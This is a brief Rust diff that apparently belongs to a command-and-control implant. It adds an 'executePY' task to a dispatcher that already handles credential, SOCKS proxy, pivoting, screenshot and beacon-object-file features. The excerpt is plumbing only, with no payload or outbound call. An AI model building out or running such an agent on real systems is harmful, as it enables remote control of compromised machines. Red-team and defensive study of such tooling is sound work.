@@ -8,6 +8,7 @@ use crate::features::psw;
 use crate::features::socks;
 use crate::features::executeBOF;
 use crate::features::executeDOT;
+use crate::features::executePY;
 use crate::features::list_processes;
 use crate::features::pivot;
 use crate::features::screenshot;
@@ -74,6 +75,10 @@ pub fn handleTask(task: &serde_json::Value) -> Result<(), Box<dyn std::error::Er
         }
         "executeDOT" => {
             executeDOT::executeDOT(task)?;
+            return Ok(());
+        }
+        "executePY" => {
+            executePY::executePY(task)?;
             return Ok(());
         }
         "ps" => {
